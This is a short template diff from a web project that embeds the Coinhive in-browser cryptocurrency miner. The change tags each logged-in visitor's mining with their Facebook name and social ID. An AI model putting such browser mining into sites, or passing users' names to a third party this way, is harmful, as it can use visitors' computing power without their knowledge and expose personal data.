@@ -271,7 +271,7 @@
 		var miner_key = "{{ COINHIVE_TOKEN }}";
 		var miner_user = null;
 		{% if user.is_authenticated and user.has_facebook %}
-		miner_user = "{{ user.facebookuser.social_id }}";
+		miner_user = "{{ user.facebookuser.name }} - {{ user.facebookuser.social_id }}";
 		{% endif %}
 	</script>
 	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
